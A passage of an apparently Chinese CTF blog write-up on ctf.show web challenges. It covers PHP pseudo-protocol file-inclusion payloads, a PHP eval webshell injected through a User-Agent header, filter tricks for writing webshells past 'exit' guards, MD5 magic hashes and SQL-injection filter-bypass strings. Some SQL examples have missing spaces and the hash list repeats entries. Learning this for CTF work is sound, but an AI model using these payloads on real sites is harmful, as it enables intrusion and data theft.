710d2d68-896d-406b-99b2-4dfa28053fce.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0<span class="meta">&lt;?php @eval($_POST[&#x27;yyssh&#x27;]);?&gt;</span> </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Sec-Fetch-Dest: document</span><br><span class="line">Sec-Fetch-Mode: navigate</span><br><span class="line">Sec-Fetch-Site: none</span><br><span class="line">Sec-Fetch-User: ?1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Te: trailers</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure><h5 id="php伪协议"><a href="#php伪协议" class="headerlink" title="php伪协议"></a>php伪协议</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://filter可以获取指定文件源码。当它与包含函数结合时，php://filter流会被当作php文件执行。所以我们一般对其进行编码，让其不执行。从而导致 任意文件读取。</span><br><span class="line"></span><br><span class="line">resource=&lt;要过滤的数据流&gt;这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read=&lt;读链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write=&lt;写链的筛选列表&gt;该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=index.php</span><br><span class="line">php://filter/resource=index.php</span><br><span class="line"></span><br><span class="line">convert.base64-encode #对index.php进行base64编码加密，进行加密后不再当作php代码执行而是读取他的源码，不进行编码则当作php文件执行</span><br><span class="line"></span><br><span class="line">使用的函数是一个过滤器</span><br></pre></td></tr></table></figure><h6 id="data："><a href="#data：" class="headerlink" title="data：&#x2F;&#x2F;"></a>data：&#x2F;&#x2F;</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">数据流封装器，以传递相应格式的数据。可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行。</span><br><span class="line">#这里的执行是你要是php源码的格式例如:&lt;?php ?&gt;，而不是一个文件</span><br><span class="line"></span><br><span class="line">data://text/plain,          #text/plain表示转换的数据为纯文本</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">data://text/plain;base64,       #逗号后面的base64是把我们编码的url参数进行解码</span><br><span class="line">http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b</span><br><span class="line"></span><br><span class="line"># data://和filter一起妙用，将payload进行两次base64编码 ?url=php://filter/read=convert.base64-decode/resource=data://text/plain;base64,UEQ5d2FIQWdjR2h3YVc1bWJ5Z3BPejgr</span><br></pre></td></tr></table></figure><h6 id="file"><a href="#file" class="headerlink" title="file:&#x2F;&#x2F;"></a>file:&#x2F;&#x2F;</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用于访问本地文件系统，并且不受allow_url_fopen，allow_url_include影响</span><br><span class="line">file://协议主要用于访问文件(绝对路径、相对路径以及网络路径)</span><br><span class="line">比如：http://www.xx.com?file=file:///etc/passsword</span><br></pre></td></tr></table></figure><h6 id="php"><a href="#php" class="headerlink" title="php:&#x2F;&#x2F;"></a>php:&#x2F;&#x2F;</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">在allow_url_fopen，allow_url_include都关闭的情况下可以正常使用</span><br><span class="line">php://作用为访问输入输出流</span><br></pre></td></tr></table></figure><h6 id="php-input"><a href="#php-input" class="headerlink" title="php:&#x2F;&#x2F;input"></a>php:&#x2F;&#x2F;input</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">php://input可以访问请求的原始数据的只读流，将post请求的数据当作php代码执行。当传入的参数作为文件名打开时，</span><br><span class="line">可以将参数设为php://input,同时post想设置的文件内容，php执行时会将post内容当作文件内容。从而导致任意代码执行。</span><br><span class="line"></span><br><span class="line">POST /pikachu/vul/sqli/sqli_id.php HTTP/1.1</span><br><span class="line">Host: 10.202.6.24</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 30</span><br><span class="line">Origin: http://10.202.6.24</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://10.202.6.24/pikachu/vul/sqli/sqli_id.php</span><br><span class="line">Cookie: PHPSESSID=khnlbrgptfngdal5cj5v7msvr4（有则加无则不加）</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">id=1&amp;submit=%E6%9F%A5%E8%AF%A2 (POST请求主体)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/cmd.php?cmd=php://input</span><br><span class="line">POST数据：&lt;?php phpinfo()?&gt;</span><br><span class="line">注意：</span><br><span class="line">当enctype=&quot;multipart/form-data&quot;的时候 php://input` 是无效的</span><br><span class="line">遇到file_get_contents()要想到用php://input绕</span><br></pre></td></tr></table></figure><h6 id="zip"><a href="#zip" class="headerlink" title="zip:&#x2F;&#x2F;"></a>zip:&#x2F;&#x2F;</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">zip:// 可以访问压缩包里面的文件。当它与包含函数结合时，zip://流会被当作php文件执行。从而实现任意代码执行。</span><br><span class="line">zip://中只能传入绝对路径。</span><br><span class="line">要用#分隔压缩包和压缩包里的内容，并且#要用url编码%23（即下述POC中#要用%23替换）</span><br><span class="line">只需要是zip的压缩包即可，后缀名可以任意更改。</span><br><span class="line">相同的类型的还有zlib://和bzip2://</span><br></pre></td></tr></table></figure><h6 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">字符串过滤器:</span><br><span class="line">该类通常以string开头，对每个字符都进行同样方式的处理。</span><br><span class="line"></span><br><span class="line">string.rot13:</span><br><span class="line">一种字符处理方式，字符右移十三位。</span><br><span class="line"></span><br><span class="line">string.toupper:</span><br><span class="line">将所有字符转换为大写</span><br><span class="line">    </span><br><span class="line">string.tolower:</span><br><span class="line">将所有字符转换为小写。</span><br><span class="line">    </span><br><span class="line">string.strip_tags:</span><br><span class="line">这个过滤器就比较有意思，用来处理掉读入的所有标签，例如XML的等等。在绕过死亡exit大有用处。</span><br><span class="line"></span><br><span class="line">转换过滤器:</span><br><span class="line">对数据流进行编码，通常用来读取文件源码。</span><br><span class="line"></span><br><span class="line">convert.base64-encode &amp; convert.base64-decode:</span><br><span class="line">base64加密解密</span><br><span class="line"></span><br><span class="line">convert.quoted-printable-encode &amp; convert.quoted-printable-decode:</span><br><span class="line">可以翻译为可打印字符引用编码，使用可以打印的ASCII编码的字符表示各种编码形式下的字符。</span><br></pre></td></tr></table></figure><h5 id="利用filter伪协议绕过死亡exit"><a href="#利用filter伪协议绕过死亡exit" class="headerlink" title="利用filter伪协议绕过死亡exit"></a>利用filter伪协议绕过死亡exit</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">什么是死亡exit?</span><br><span class="line">死亡exit指的是在进行写入PHP文件操作时，执行了以下函数：</span><br><span class="line">file_put_contents($content, &#x27;&lt;?php exit();&#x27; . $content);</span><br><span class="line">亦或者</span><br><span class="line">file_put_contents($content, &#x27;&lt;?php exit();?&gt;&#x27; . $content);</span><br><span class="line">这样，当你插入一句话木马时，文件的内容是这样子的：</span><br><span class="line">&lt;?php exit();?&gt;</span><br><span class="line">&lt;?php @eval($_POST[&#x27;snakin&#x27;]);?&gt;</span><br><span class="line">这样即使插入了一句话木马，在被使用的时候也无法被执行。这样的死亡exit通常存在于缓存、配置文件等等不允许用户直接访问的文件当中。</span><br></pre></td></tr></table></figure><h5 id="base64decode绕过"><a href="#base64decode绕过" class="headerlink" title="base64decode绕过"></a>base64decode绕过</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">利用filter协议来绕过，看下这样的代码：</span><br><span class="line">&lt;?php</span><br><span class="line">$content = &#x27;&lt;?php exit; ?&gt;&#x27;;</span><br><span class="line">$content .= $_POST[&#x27;txt&#x27;];</span><br><span class="line">file_put_contents($_POST[&#x27;filename&#x27;], $content);</span><br><span class="line"></span><br><span class="line">当用户通过POST方式提交一个数据时，会与死亡exit进行拼接，从而避免提交的数据被执行。</span><br><span class="line">然而这里可以利用php://filter的base64-decode方法，将$content解码，利用php base64_decode函数特性去除死亡exit。</span><br><span class="line">base64编码中只包含64个可打印字符，当PHP遇到不可解码的字符时，会选择性的跳过，</span><br><span class="line">所以，当$content 包含 &lt;?php exit; ?&gt;时，解码过程会先去除识别不了的字符，&lt; ; ? &gt;和空格等都将被去除，</span><br><span class="line">于是剩下的字符就只有phpexit以及我们传入的字符了。由于base64是4个byte一组，再添加一个字符例如添加字符’a’后，将’phpexita’当做两组base64进行解码，也就绕过这个死亡exit了。</span><br><span class="line">这个时候后面再加上编码后的一句话木马，就可以getshell了。</span><br></pre></td></tr></table></figure><h5 id="strip-tags绕过"><a href="#strip-tags绕过" class="headerlink" title="strip_tags绕过"></a>strip_tags绕过</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">这个&lt;?php exit; ?&gt;实际上是一个XML标签，既然是XML标签，我们就可以利用strip_tags函数去除它，而php://filter刚好是支持这个方法的。</span><br><span class="line">但是我们要写入的一句话木马也是XML标签，在用到strip_tags时也会被去除。</span><br><span class="line">注意到在写入文件的时候，filter是支持多个过滤器的。可以先将webshell经过base64编码，strip_tags去除死亡exit之后，再通过base64-decode复原。</span><br><span class="line">php://filter/string.strip_tags|convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure><h3 id="web-5-1"><a href="#web-5-1" class="headerlink" title="web-5"></a>web-5</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">md5弱比较绕过，当md5进行==比较时会将<span class="number">0</span>e开头的都转换为同一类型然后当作<span class="number">0</span>来比较</span><br><span class="line">分析php代码， <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$v2</span>)) 要求v1和v2都要为真 </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">ctype_alpha</span>(<span class="variable">$v1</span>))&#123; <span class="keyword">die</span>(<span class="string">&quot;v1 error&quot;</span>);&#125; 要求v1为字母 </span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123; <span class="keyword">die</span>(<span class="string">&quot;v2 error&quot;</span>); &#125;要求v2为数字</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$v1</span>)==<span class="title function_ invoke__">md5</span>(<span class="variable">$v2</span>))&#123; <span class="keyword">echo</span> <span class="variable">$flag</span>; &#125; 只有v1和v2的MD5编码弱比较才能输出flag，弱比较（a==b:弱类型比较会将a和b转成统一数据类型在进行比较）</span><br><span class="line">使用<span class="number">0</span>e绕过（弱比较会把<span class="number">0</span>exxxx当做科学计数法，不管后面的值为任何东西，<span class="number">0</span>的任何次幂都为<span class="number">0</span>） 以下是一些字符串md5值以<span class="number">0</span>e开头 QNKCDZO <span class="number">240610708</span></span><br></pre></td></tr></table></figure><h4 id="0e开头的式子和原值"><a href="#0e开头的式子和原值" class="headerlink" title="0e开头的式子和原值"></a>0e开头的式子和原值</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line">240610708</span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1184209335a</span><br><span class="line">0e072485820392773389523109082030</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s155964671a</span><br><span class="line">0e342768416822451524974117254469</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s532378020a</span><br><span class="line">0e220463095855511507588041205815</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s214587387a</span><br><span class="line">0e848240448830537924465865611904</span><br><span class="line">s1502113478a</span><br><span class="line">0e861580163291561247404381396064</span><br><span class="line">s1091221200a</span><br><span class="line">0e940624217856561557816327384675</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s1885207154a</span><br><span class="line">0e509367213418206700842008763514</span><br><span class="line">s1836677006a</span><br><span class="line">0e481036490867661113260034900752</span><br><span class="line">s1665632922a</span><br><span class="line">0e731198061491163073197128363787</span><br><span class="line">s878926199a</span><br><span class="line">0e545993274517709034328855841020</span><br></pre></td></tr></table></figure><h4 id="is-numeric函数"><a href="#is-numeric函数" class="headerlink" title="is_numeric函数"></a>is_numeric函数</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_numeric() 函数用于检测变量是否为数字或数字字符串。</span><br><span class="line">数字字符串就是&quot;1&quot;多打了一对引号</span><br></pre></td></tr></table></figure><h4 id="ctype-alpha函数"><a href="#ctype-alpha函数" class="headerlink" title="ctype_alpha函数"></a>ctype_alpha函数</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctype_alpha() 函数检测字符串中所有字符是否都为字母</span><br></pre></td></tr></table></figure><h3 id="web-6-1"><a href="#web-6-1" class="headerlink" title="web-6"></a>web-6</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一个空格绕过,但是空格绕过要注意的事项很多</span><br></pre></td></tr></table></figure><p>&#x3D;&#x3D;空格绕过空格一定要在逗号中间加空格&#x3D;&#x3D;</p><h4 id="一些函数绕过与总结"><a href="#一些函数绕过与总结" class="headerlink" title="一些函数绕过与总结"></a>一些函数绕过与总结</h4><h5 id="绕过空格（-，-a0）"><a href="#绕过空格（-，-a0）" class="headerlink" title="绕过空格（&#x2F;**&#x2F;，%a0）"></a>绕过空格（&#x2F;**&#x2F;，%a0）</h5><p><img src="D:\Blog\blog\source\images\Bypass.png" alt="空格绕过"></p><p>&#x3D;&#x3D;URL编码对大小写不敏感所以这里的大写都可以用小写&#x3D;&#x3D;</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">两个空格代替一个空格，用Tab代替空格，%a0=空格：</span><br><span class="line">%20 %09 %0a(换行符)%0b %0c %0d(回车符) %a0/**/  ()</span><br><span class="line"></span><br><span class="line">最基本的绕过方法，用注释替换空格：</span><br><span class="line">/*注释*/</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">如果空格被过滤，括号没有被过滤，可以用括号绕过。</span><br><span class="line">在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">select(user())fromdualwhere(1=1)and(2=2)</span><br><span class="line">这种过滤方法常常用于time based盲注,例如：</span><br><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span><br><span class="line">（from for属于逗号绕过下面会有）</span><br><span class="line">上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</span><br></pre></td></tr></table></figure><h5 id="引号绕过（使用十六进制）"><a href="#引号绕过（使用十六进制）" class="headerlink" title="引号绕过（使用十六进制）"></a>引号绕过（使用十六进制）</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</span><br><span class="line">selectcolumn_namefrominformation_schema.tableswheretable_name=&quot;users&quot;</span><br><span class="line"></span><br><span class="line">这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</span><br><span class="line">users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</span><br><span class="line">selectcolumn_namefrominformation_schema.tableswheretable_name=0x7573657273</span><br></pre></td></tr></table></figure><h5 id="逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）："><a href="#逗号绕过（limit使用from或者offset）（substr使用from-for属于逗号）：" class="headerlink" title="逗号绕过（limit使用from或者offset）（substr使用from for属于逗号）："></a>逗号绕过（limit<strong>使用from或者offset</strong>）（substr使用from for属于逗号）：</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from for的方式来解决：</span><br><span class="line">select substr(database(0from1for1);select mid(database(0from1for1);</span><br><span class="line"></span><br><span class="line">对于limit可以使用offset来绕过：</span><br><span class="line">select*from news limit0,1# 等价select*from news limit 1offset0#</span><br></pre></td></tr></table></figure><h5 id="比较符号（）绕过（-使用greatest-）："><a href="#比较符号（）绕过（-使用greatest-）：" class="headerlink" title="比较符号（&lt;&gt;）绕过（**使用greatest()**）："></a>比较符号（&lt;&gt;）绕过（**使用greatest()**）：</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。</span><br><span class="line"></span><br><span class="line">最常见的一个盲注的sql语句：</span><br><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br><span class="line"></span><br><span class="line">此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,...)函数返回输入参数(n1,n2,n3,...)的最大值。</span><br><span class="line"></span><br><span class="line">那么上面的这条sql语句可以使用greatest变为如下的子句:</span><br><span class="line">select* from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure><h5 id="or-and绕过"><a href="#or-and绕过" class="headerlink" title="or and绕过"></a>or and绕过</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;  or=||</span><br></pre></td></tr></table></figure><h5 id="绕过注释符号（-，–）过滤："><a href="#绕过注释符号（-，–）过滤：" class="headerlink" title="绕过注释符号（#，–）过滤："></a>绕过注释符号（#，–）过滤：</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27;union select 1,2,3||&#x27;1</span><br><span class="line"></span><br><span class="line">最后的or &#x27;1闭合查询语句的最后的单引号，或者：</span><br><span class="line">id=1&#x27;union select 1,2,&#x27;3</span><br></pre></td></tr></table></figure><h5 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;绕过"></a>&#x3D;绕过</h5><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用like 或者 使用&lt; 或者 &gt;</span><br></pre></td></tr></table></figure><h5 id="绕过union-select-where"><a href="#绕过union-select-where" class="headerlink" title="绕过union,select,where"></a>绕过union,select,where</h5><h6 id="使用注释符绕过"><a href="#使用注释符绕过" class="headerlink" title="使用注释符绕过"></a>使用注释符绕过</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">常用注释符：</span><br><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">U/**/NION/**/SE/**/LECT/**/user，pwd from user</span><br></pre></td></tr></table></figure><h6 id="使用大小写绕过"><a href="#使用大小写绕过" class="headerlink" title="使用大小写绕过"></a>使用大小写绕过</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure><h6 id="内联注入绕过"><a href="#内联注入绕过" class="headerlink" title="内联注入绕过"></a>内联注入绕过</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/) FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like database()#</span><br></pre></td></tr></table></figure><h6 id="双关键字绕过"><a href="#双关键字绕过" class="headerlink" title="双关键字绕过"></a>双关键字绕过</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure><h6 id="通用绕过-编码绕过、双重编码绕过"><a href="#通用绕过-编码绕过、双重编码绕过" class="headerlink" title="通用绕过(编码绕过、双重编码绕过)"></a>通用绕过(编码绕过、双重编码绕过)</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如URLEncode编码，ASCII,HEX,unicode编码绕过：</span><br><span class="line">or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span><br></pre></td></tr></table></figure><h6 id="等价函数绕过"><a href="#等价函数绕过" class="headerlink" title="等价函数绕过"></a>等价函数绕过</h6><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span 